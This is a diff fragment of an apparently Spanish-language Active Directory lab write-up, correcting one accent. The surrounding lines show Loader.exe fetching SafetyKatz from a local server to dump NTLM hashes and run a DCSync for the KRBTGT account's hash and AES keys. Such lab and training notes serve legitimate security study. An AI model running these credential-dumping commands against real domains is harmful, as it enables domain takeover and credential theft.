@@ -39,7 +39,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 
 Pudiendo extraer así los hashes *NTLM* en este caso el que buscabamos es el del usuario *KRBTGT*
 
-Tambien si queremos el hash y las claves AES de una cuenta en especifico podemos usar un ataque *DCSync*
+También si queremos el hash y las claves AES de una cuenta en especifico podemos usar un ataque *DCSync*
 ``` shell
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
